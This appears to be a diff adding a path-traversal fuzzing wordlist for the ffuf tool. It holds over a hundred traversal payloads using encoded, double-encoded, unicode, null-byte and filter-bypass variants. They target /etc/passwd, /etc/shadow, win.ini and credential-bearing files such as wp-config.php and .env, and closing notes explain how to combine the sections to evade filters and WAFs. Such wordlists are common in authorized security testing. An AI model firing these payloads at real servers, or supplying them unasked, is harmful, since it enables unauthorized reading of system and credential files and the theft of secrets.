@@ -1,0 +1,135 @@
+# ============================================================
+# Path Traversal Fuzzing Wordlist
+# Usage: ffuf -u http://example.com/download?file=FUZZ -w this_file.txt
+# For authorized security testing only.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: Basic traversal depths (Linux target /etc/passwd)
+# ---------------------------------------
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../../etc/passwd
+
+# ---------------------------------------
+# SECTION 2: Basic traversal depths (Windows target win.ini)
+# ---------------------------------------
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\windows\win.ini
+../windows/win.ini
+../../windows/win.ini
+../../../windows/win.ini
+../../../../windows/win.ini
+../../../../../windows/win.ini
+
+# ---------------------------------------
+# SECTION 3: URL-encoded traversal
+# ---------------------------------------
+..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%5c..%5c..%5cwindows%5cwin.ini
+%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+..%c0%af..%c0%af..%c0%afetc%2fpasswd
+..%c1%9c..%c1%9c..%c1%9cetc%2fpasswd
+
+# ---------------------------------------
+# SECTION 4: Double URL-encoded traversal
+# ---------------------------------------
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+%252e%252e/%252e%252e/%252e%252e/etc/passwd
+..%255c..%255c..%255cwindows%255cwin.ini
+
+# ---------------------------------------
+# SECTION 5: Overlong UTF-8 / unicode encoding bypass
+# ---------------------------------------
+..%u2216..%u2216..%u2216etc%u2216passwd
+..%uff0e%uff0e%u2215etc%u2215passwd
+%uff0e%uff0e/%uff0e%uff0e/etc/passwd
+
+# ---------------------------------------
+# SECTION 6: Filter bypass - dot/slash obfuscation
+# ---------------------------------------
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+..././..././..././etc/passwd
+..;/..;/..;/etc/passwd
+.../.../.../etc/passwd
+....//....//....//....//etc/passwd
+..././.././.././etc/passwd
+../\../\../\etc/passwd
+..\/..\/..\/etc\/passwd
+
+# ---------------------------------------
+# SECTION 7: NULL byte / absolute path bypass (older stacks)
+# ---------------------------------------
+/etc/passwd%00
+../../../../etc/passwd%00
+../../../../etc/passwd%00.png
+../../../../etc/passwd%00.jpg
+/etc/passwd\0
+../../../../etc/passwd#
+
+# ---------------------------------------
+# SECTION 8: Absolute path direct (no traversal, in case base path is stripped)
+# ---------------------------------------
+/etc/passwd
+/etc/shadow
+/windows/win.ini
+C:/windows/win.ini
+C:\windows\win.ini
+file:///etc/passwd
+file:///c:/windows/win.ini
+\\localhost\c$\windows\win.ini
+
+# ---------------------------------------
+# SECTION 9: Mixed slash / backslash confusion
+# ---------------------------------------
+..\../..\../..\../etc/passwd
+../..\../..\../..\etc\passwd
+..\/..\/..\/etc/passwd
+
+# ---------------------------------------
+# SECTION 10: Long traversal chains with junk padding (bypass depth limits)
+# ---------------------------------------
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../etc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+
+# ---------------------------------------
+# SECTION 11: Application-specific known targets (web root config leaks)
+# ---------------------------------------
+../../../../etc/passwd
+../../../../var/www/html/config.php
+../../../../var/www/html/wp-config.php
+../../../../application/config/database.php
+../../../../.env
+../../../../../.env
+../../../../WEB-INF/web.xml
+../../../../WEB-INF/classes/application.properties
+../../../../../../WEB-INF/web.xml
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - Start with Section 1/2 to find the correct traversal depth, then
+#   swap the target file for anything in lfi_wordlist.txt Section 1/2.
+# - If ../ is stripped once, try Section 6 obfuscated variants (....//)
+#   which become ../ after a single naive strip.
+# - Combine with encoding from Section 3/4 if the WAF/app decodes twice.
+# - Only use against systems you are explicitly authorized to test.
